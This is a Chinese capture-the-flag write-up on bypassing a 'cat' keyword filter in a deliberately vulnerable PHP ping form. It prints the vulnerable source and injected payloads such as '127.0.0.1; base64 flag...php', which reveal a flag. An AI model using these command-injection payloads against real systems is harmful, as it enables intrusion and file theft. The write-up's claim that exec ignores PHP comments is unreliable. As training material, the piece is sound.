---
title: CTFHub 命令注入-过滤cat
date: 2026-10-23
categories: CTFHub Web 命令注入 
tags: CTFHub Web 命令注入 
---

# 题目：CTFHub 命令注入 - 过滤cat

## 题目描述
打开题目页面，源码如下：
```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/cat/", $ip, $m)) {
        $cmd = "ping -c 4 {$ip}";
        exec($cmd, $res);
    } else {
        $res = $m;
    }
}
?>
```
*分析：*
服务器使用 preg_match_all 过滤了 cat 字符串。如果输入包含 cat，直接拦截。
依然是命令注入漏洞。
exec 函数只捕获输出结果。

## 解题思路
### 漏洞原理
既然 cat 被禁用了，Linux 系统中还有很多其他命令可以读取文件：
*tac：* 反向输出文件内容。
*more / less：* 分页查看文件。
*nl：* 带行号输出。
*base64：* 将文件内容进行 Base64 编码输出。

## 解题步骤
1. 寻找 Flag 文件
在输入框输入：
```text
127.0.0.1; ls
```
找到目标文件 flag_279691366324838.php。

2. 尝试 tac 读取
输入：
```text
127.0.0.1; tac flag_279691366324838.php
```
结果： 页面无回显。因为 flag 在 PHP 注释里，exec 函数忽略了。

3. 利用 Base64 强行读取
使用 base64 命令将该文件内容编码为单行字符串输出：
```text
127.0.0.1; base64 flag_279691366324838.php
```
返回结果：
```text
PD9waHAgLy8gY3RmaHViezJkYjY5YjcxNGRlM2YzNTgzZWZmOTA3OX0K
```

4. 解码获取 Flag
将上述 Base64 字符串在线解码，得到：
```php
<?php // ctfhub{2db69b714de3f3583eff9079}
```
提交 flag.

## 踩坑指南
1. tac 命令读不出内容
原因： 目标文件内的内容被 PHP 注释包裹，exec 会将其忽略。
解决： 使用 base64 进行编码，避开执行限制，强行回显。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| 黑名单绕过 | 替换同义命令（`tac`、`more`、`base64`） |
| `base64` 命令 | 将文件内容进行 Base64 编码输出 |
| `preg_match_all` | PHP 正则匹配函数 |

### 防御建议
1. 使用白名单：严格限制 ip 参数格式。
2. 禁用危险命令：在系统层面上禁止执行读取文件的命令。
